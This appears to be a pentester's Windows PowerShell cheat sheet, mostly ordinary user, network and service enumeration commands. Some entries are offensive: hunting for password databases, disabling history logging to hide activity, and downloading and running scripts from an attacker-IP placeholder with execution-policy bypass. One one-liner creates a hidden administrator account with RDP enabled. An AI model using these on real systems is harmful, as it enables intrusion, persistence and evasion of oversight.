Find a file in the system

```powershell
Get-ChildItem -Path C:\ -Include *.EXTENSION -File -Recurse -ErrorAction SilentlyContinue
```

Filter for a specific extension of a file in the Administrator folder

```powershell
Get-ChildItem -Path C:\Users\Administrator\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.exe,*.png,*.jpg,*.bin,*.zip,*.bak*,*.md -File -Recurse -ErrorAction SilentlyContinue
```

Find groups of the user Administrator

```powershell
net user Administrator
```

Run a user with another user's identity

```powershell
runas /user:Administrator cmd
```

Find identity of the current user

```powershell
whoami
```

Display the groups of the current user

```powershell
whoami /groups
```

Display the user privileges

```powershell
whoami /priv
```

Get a list of all local users

```powershell
Get-LocalUser
```

Get a list of all local groups

```powershell
Get-LocalGroup
```

Get the list of user for a group

```powershell
Get-LocalGroupMember <GROUPNAME>
```

Gather OS info, CPU info, RAM, BIOS version etc...

```powershell
systeminfo
```

Gather network information such as IP, DNS servers, DHCP info etc...

```powershell
ipconfig /all
```

Display routing table

```powershell
route print
```

List active network connection (**-a** for active TCP connections/UDP ports, **-n** for no name resolution, **-o** for displaying process ID)

```powershell
netstat -ano
```

Get informations of installed applications and filter for useful informations. For 32 bit application we use

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
```

And for 64 bit applications

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Get the list of running processes

```powershell
Get-Process
```

Get powershell history

```powershell
Get-History
```

If it is used the `Clear-History` command we could retrive the history with `PSReadline`

```powershell
(Get-PSReadlineOption).HistorySavePath
```

In order to prevent also that this history is saved, we must clear the history with

```powershell
Set-PSReadlineOption, -HistorySaveStyle, SaveNothing
```

Run a ps script from RAM

```powershell
iwr -uri http://<ATTACKER-IP>/winPEASx64.exe -Outfile winPEAS.exe
```

or

```powershell
powershell -ep bypass -c "iex(iwr -uri <IP>/script.ps1 -usebasicparsing)"
```

Get a list of the **running** Windows Services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Show user permissions on a file

```powershell
icacls "C:\path\to\file.exe"
```

Start or stop a service

```powershell
net stop apache2
net start apache2
```

Print all files in a directory

```powershell
Get-ChildItem -Path "C:\Users\diana\Documents" | ForEach-Object { Write-Host "Contents of $($_.Name):"; Get-Content $_.FullName; Write-Host "-------------------------" }
```

Show listening TCP ports

```powershell
netstat -anp TCP | find "<PORT>"
```

Get the list of the domain computers

```powershell
 net view
```

View the list of shares in a domain SMB machine

```powershell
 net view \\<COMPUTER-NAME>
```

Recursively copy folder A in folder B

```powershell
Copy-Item C:\path\to\A H:\B -Recurse -Force
```

[Crazywifi's oneliner](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD) for adding user to RDP

```powershell
net user /add (Username) (Password) && net localgroup administrators (Username) /add & net localgroup "Remote Desktop Users" (Username) /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v (Username) /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto
```

Connect via RDP to a machine using password and specific resolution

```powershell
xfreerdp /u:USER /p:'PASSWORD' /v:IP /size:1920x1080
```